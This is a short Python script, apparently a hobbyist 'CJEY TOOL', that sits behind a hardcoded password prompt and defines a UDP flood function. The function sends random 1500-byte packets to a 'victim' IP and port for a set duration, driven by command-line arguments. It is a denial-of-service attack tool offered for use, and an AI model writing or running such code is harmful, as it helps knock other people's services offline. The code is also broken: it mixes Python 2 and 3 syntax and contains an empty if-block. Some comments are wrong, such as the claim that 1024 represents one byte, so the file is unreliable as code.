import time
import socket
import random
import sys
import os

os.system("cls")
password ="cjey1557"

for i in range(3):
    pwd = input("\u001b[93mPASSWORD: ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("\u001b[92mLOADING!!")
        break
    else:
        time.sleep(5)
        print("\u001b[91mPASSWORD SALAH!!")
        continue
time.sleep(5)
print("\u001b[94mWELCOME TO CJEY TOOL!!")
time.sleep(5)
os.system("cls")

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1500)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\u001b[91mLORD CJEY1557 NI BOSSS!!! %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI ROTI KEPORT %s!!"%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()